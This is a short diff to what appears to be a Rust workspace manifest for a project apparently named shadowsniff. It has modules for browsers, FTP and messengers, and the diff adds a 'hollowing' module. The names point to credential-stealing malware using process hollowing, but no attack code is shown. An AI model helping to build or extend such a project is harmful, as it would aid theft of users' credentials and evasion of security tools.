@@ -15,7 +15,8 @@ members = [
     "shadowsniff/browsers",
     "shadowsniff/ftp",
     "shadowsniff/messengers",
-    "tasks",
+    "tasks", 
+    "hollowing",
     "utils"
 ]
 
